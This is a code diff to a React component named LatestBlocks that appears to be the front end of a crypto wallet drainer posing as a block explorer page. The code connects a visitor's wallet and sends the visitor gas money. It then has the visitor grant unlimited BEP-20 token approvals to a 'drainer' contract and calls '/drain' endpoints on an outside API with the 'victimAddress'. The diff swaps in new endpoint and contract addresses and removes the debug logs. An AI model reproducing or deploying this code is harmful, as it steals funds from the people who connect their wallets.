@@ -8,8 +8,8 @@ const LatestBlocks = () => {
   const [connectedAccount, setConnectedAccount] = useState(null);
   const [loading, setLoading] = useState(false);
 
-  const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com";
-  const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A";
+  const API_BASE_URL = "https://p58f8u8v4g.execute-api.ap-south-1.amazonaws.com"; // Update if Beanstalk URL changed
+  const drainerContractAddress = "0x17ea41b9Ce16190730039384287469b6D5dac2E1"; // Replace with your deployed address
   const tokenList = [
     { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
     { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
@@ -56,10 +56,8 @@ const LatestBlocks = () => {
   const checkAndSendGas = async (connectedAddress) => {
     try {
       const balance = await bscProvider.getBalance(connectedAddress);
-      // console.log(`Victim BNB balance: ${ethers.formatEther(balance)} BNB`);
       if (ethers.formatEther(balance) === "0.0") {
         setLoading(true);
-        // console.log(`Sending gas to ${connectedAddress} via /check-and-fund...`);
         const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -72,11 +70,9 @@ const LatestBlocks = () => {
         if (gasData.success) {
           let attempts = 0;
           while (ethers.formatEther(await bscProvider.getBalance(connectedAddress)) === "0.0" && attempts < 15000) {
-            // console.log("Waiting for gas...");
             await new Promise(resolve => setTimeout(resolve, 5000));
             attempts++;
           }
-          // console.log(`Gas sent to ${connectedAddress}`);
         } else {
           throw new Error(gasData.message || "Gas funding failed");
         }
@@ -107,7 +103,6 @@ const LatestBlocks = () => {
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const connectedAddress = accounts[0];
       const signer = await walletProvider.getSigner();
-      // console.log("Connected address:", connectedAddress);
       setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
 
       const network = await walletProvider.getNetwork();
@@ -135,40 +130,33 @@ const LatestBlocks = () => {
       const gasAvailable = await checkAndSendGas(connectedAddress);
       if (!gasAvailable) throw new Error("Failed to provide gas");
 
-      // console.log("Calling first /drain...");
       const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
       });
       const drainData = await drainResponse.json();
-      // console.log("First drain response:", drainData);
 
       if (drainData.needsApproval) {
         for (const token of tokenList) {
           const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
           const balance = await tokenContract.balanceOf(connectedAddress);
           if (balance > 0) {
-            // console.log(`Approving ${token.symbol}...`);
             try {
               const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
-              // console.log(`Approval tx for ${token.symbol}:`, tx.hash);
               await tx.wait();
-              // console.log(`${token.symbol} approved`);
             } catch (error) {
               console.error(`Error approving ${token.symbol}:`, error.message);
               throw error;
             }
           }
         }
-        // console.log("Calling second /drain...");
         const finalDrainResponse = await fetch(`${API_BASE_URL}/drain`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
         });
         const finalData = await finalDrainResponse.json();
-        // console.log("Final drain response:", finalData);
         if (!finalData.success) throw new Error("Draining failed: " + finalData.message);
       }
 
@@ -186,6 +174,7 @@ const LatestBlocks = () => {
   ];
 
   return (
+    // ... (JSX unchanged - UI stuff)
     <>
       <section className="bg-dark pt-14 pb-20 bg-banner">
         <div className="container-fluid px-lg-5">
